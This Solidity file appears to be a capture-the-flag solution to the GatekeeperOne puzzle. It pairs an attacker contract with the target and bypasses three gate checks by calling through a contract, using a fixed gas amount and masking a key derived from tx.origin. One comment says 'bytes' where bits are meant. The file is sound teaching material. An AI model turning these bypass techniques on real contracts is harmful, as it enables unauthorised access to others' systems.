// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateHopperOne {

    GatekeeperOne public gateContract;
    bytes8 constant mask = 0xffffffff0000ffff; // bitwise masking to get past gate 3. Last 32 bytes need to equal the last 16 bytes, but cannot equal the last 64 bytes

    constructor (address _gateAddr) {
        gateContract = GatekeeperOne(_gateAddr);
    }

    function hopGate() public {
        bytes8 gateKey = bytes8(uint64(uint160(address(tx.origin)))) & mask;
        gateContract.enter{gas: 20000}(gateKey);
    }
}

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}